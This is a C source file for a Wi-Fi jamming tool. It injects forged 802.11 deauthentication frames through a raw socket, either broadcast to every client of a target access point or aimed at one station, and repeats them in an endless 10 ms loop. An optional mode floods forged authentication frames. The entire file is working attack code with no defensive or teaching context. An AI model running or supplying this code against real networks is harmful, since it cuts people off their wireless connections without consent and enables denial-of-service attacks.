#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/socket.h>

#include <netinet/in.h>

#include <linux/if.h>
#include <linux/if_ether.h> 
#include <linux/if_packet.h>

#include "main.h"

const uint8_t DEAUTH_RADIOTAB_CONSTANTS[] = \
    "\x00\x00\x0c\x00\x04\x80\x00\x00\x02\x00\x18\x00";

const uint8_t AUTH_RADIOTAB_CONSTANTS[] = \
    "\x00\x00\x18\x00\x2e\x40\x00\xa0\x20\x08\x00\x00\x00\x02\x6c\x09" \
    "\xa0\x00\xd7\x00\x00\x00\xd7\x00";



int main(int argc, const char *argv[]) {
    int sock_fd;
    struct ifreq ifr;
    struct sockaddr_ll sadr;
    mac_t ap_mac;
    mac_t station_mac;

    /*
        args check
    */
    if (argc < 3 || argc > 5) {
        ERR("Usage: %s <interface> <ap mac> [<station mac> [-auth]]", *argv);
    }

    /*
        interface name length check
    */
    if (strnlen(argv[1], IFNAMSIZ) >= IFNAMSIZ) {
        ERR("Invalid interface name!!");
    }

    /*
        open raw socket
    */
    if ((sock_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        ERR("Could not open socket!!");
    }

    /*
        bind interface
    */
    strncpy(ifr.ifr_name, argv[1], IFNAMSIZ);
    
    if (ioctl(sock_fd, SIOCGIFINDEX, &ifr) < 0) {
        ERR("Failed ioctl!!");
    }

    sadr.sll_family = AF_PACKET;
    sadr.sll_ifindex = ifr.ifr_ifindex;
    sadr.sll_protocol = htons(ETH_P_ALL);

    if (bind(sock_fd, (struct sockaddr*)&sadr, sizeof(sadr)) < 0) {
        ERR("Bind error!!");
    }

    if (sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", MAC_TO_CHAR_P(&ap_mac)) != 6) {
        ERR("ap mac is not valid");
    }

    if (argc > 3 && sscanf(argv[3], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", MAC_TO_CHAR_P(&station_mac)) != 6) {
        ERR("station mac is not valid");
    }

    if (argc == 5 && strncmp(argv[4], "-auth", 5)) {
        ERR("'%s' is not valid", argv[4]);
    }
    

    switch (argc) {
        case 3:
        deauth_attack(sock_fd, &ap_mac, (mac_t*)"\xFF\xFF\xFF\xFF\xFF\xFF");
        break;
        case 4:
        deauth_attack(sock_fd, &ap_mac, &station_mac);
        break;
        case 5:
        auth_attack(sock_fd, &ap_mac, &station_mac);
        break;
    }
}

int send_packet(int socket_fd, packet_t* packet) {
    if (write(socket_fd, &packet->data, packet->length) != packet->length) {
        ERR("Packet write error!");
    }

    return 0;
}

void deauth_attack(int socket_fd, mac_t* ap_mac, mac_t* station_mac) {
    deauth_packet_t packet;

    packet.length = 38;
    memcpy(&packet.radio_header, DEAUTH_RADIOTAB_CONSTANTS, 12);
    packet.radio_body.version = 0;
    packet.radio_body.type = 0;
    packet.radio_body.subtype = 12;
    packet.radio_body.flags = 0;
    memcpy(&packet.radio_body.receiver, station_mac, sizeof(mac_t));
    memcpy(&packet.radio_body.trasmitter, ap_mac, sizeof(mac_t));
    memcpy(&packet.radio_body.bss_id, ap_mac, sizeof(mac_t));
    packet.radio_body.fragment = 0;
    packet.radio_body.sequence = 0;
    packet.reason_code = 7;

    while (1) {
        send_packet(socket_fd, (packet_t*)&packet);
        ++packet.radio_body.sequence;
        usleep(10000);
    }
}

void auth_attack(int socket_fd, mac_t* ap_mac, mac_t* station_mac) {
    auth_packet_t packet;

    packet.length = 54;
    memcpy(&packet.radio_header, AUTH_RADIOTAB_CONSTANTS, 24);
    packet.radio_body.version = 0;
    packet.radio_body.type = 0;
    packet.radio_body.subtype = 12;
    packet.radio_body.flags = 0;
    memcpy(&packet.radio_body.receiver, station_mac, sizeof(mac_t));
    memcpy(&packet.radio_body.trasmitter, ap_mac, sizeof(mac_t));
    memcpy(&packet.radio_body.bss_id, ap_mac, sizeof(mac_t));
    packet.radio_body.fragment = 0;
    packet.radio_body.sequence = 0;
    packet.auth_algo = 0;
    packet.auth_seq = 1;
    packet.status_code = 0;
    
    while (1) {
        send_packet(socket_fd, (packet_t*)&packet);
        ++packet.radio_body.sequence;
        usleep(10000);
    }
}
